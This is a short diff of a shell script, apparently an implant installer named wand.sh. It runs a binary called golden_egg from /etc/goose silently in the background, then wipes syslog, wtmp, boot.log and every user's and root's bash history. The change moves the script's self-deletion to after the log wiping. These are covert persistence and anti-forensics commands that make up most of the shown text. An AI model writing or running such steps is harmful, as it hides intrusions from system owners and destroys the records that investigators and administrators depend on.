@@ -90,9 +90,6 @@ rm /etc/goose/.golden_egg.c
 # Run the binary in background
 nohup /etc/goose/golden_egg </dev/null >/dev/null 2>&1 &
 
-# Remove Script
-sudo rm wand.sh
-
 # Clear logs
 > /var/log/syslog
 > /var/log/wtmp
@@ -102,3 +99,6 @@ sudo rm wand.sh
 > /var/log/boot.log
 > /home/*/.bash_history
 > /root/.bash_history
+
+# Remove Script
+rm wand.sh
